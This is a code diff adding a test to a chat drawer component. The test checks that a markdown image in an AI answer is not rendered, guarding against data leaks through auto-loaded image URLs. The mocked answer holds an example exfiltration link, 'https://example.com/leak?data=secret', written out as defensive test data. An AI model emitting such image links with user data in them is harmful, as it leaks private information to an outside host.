@@ -165,6 +165,29 @@ describe('ChatDrawer', function () {
     expect(document.querySelector('.chatDrawer')).toMatchSnapshot();
   });
 
+  it("doesn't load images from the answer", async function () {
+    const { openChat, send } = setup({ apiKey: 'sk-ant-test' });
+    mockMessagesApi([
+      {
+        content: [
+          {
+            type: 'text',
+            text: 'See ![chart](https://example.com/leak?data=secret) here.',
+          },
+        ],
+        stopReason: 'end_turn',
+      },
+    ]);
+    openChat();
+    await send('Show me a chart');
+
+    const drawer = ensureExists(
+      document.querySelector<HTMLElement>('.chatDrawer')
+    );
+    expect(await within(drawer).findByText(/here\./)).toBeInTheDocument();
+    expect(drawer.querySelector('img')).toBeNull();
+  });
+
   it('can be stopped', async function () {
     const { openChat, send } = setup({ apiKey: 'sk-ant-test' });
     let respond: (() => void) | null = null;
